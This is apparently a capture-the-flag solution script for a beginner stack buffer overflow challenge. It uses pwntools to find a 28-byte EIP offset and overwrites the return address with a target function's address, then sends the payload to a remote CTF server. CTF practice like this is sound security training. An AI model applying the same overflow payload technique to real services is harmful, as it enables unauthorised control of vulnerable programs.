#!/usr/bin/env python3
from pwn import *

"""
First, find the offset in the buffer that aligns to EIP in the end. We will do this using a cyclic pattern.

Program crashes with EIP being 0x61616168.

Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()

cyclic_find tells us the offset is 28.

Next, find the address of the function we want to return to, "target" in this case:

(gdb) p target
$1 = {<text variable, no debug info>} 0x80491f5 <target>

The address of function target is 0x80491f5.

Pwntools can handle the rest, build a buffer that is 28_bytes + ret_addr and voila!
"""

print('cyclic', cyclic(100).decode())
print('cyclic_find', cyclic_find(0x61616168))

# p = process(['./babybufov'])
p = remote('challenge.ctf.games', 31912)  # update to port that is provided

target_addr = p32(0x080491f5)

payload = b'A' * 28 + target_addr  # overwrite target_addr so it returns back to it

p.sendline(payload)
p.interactive()
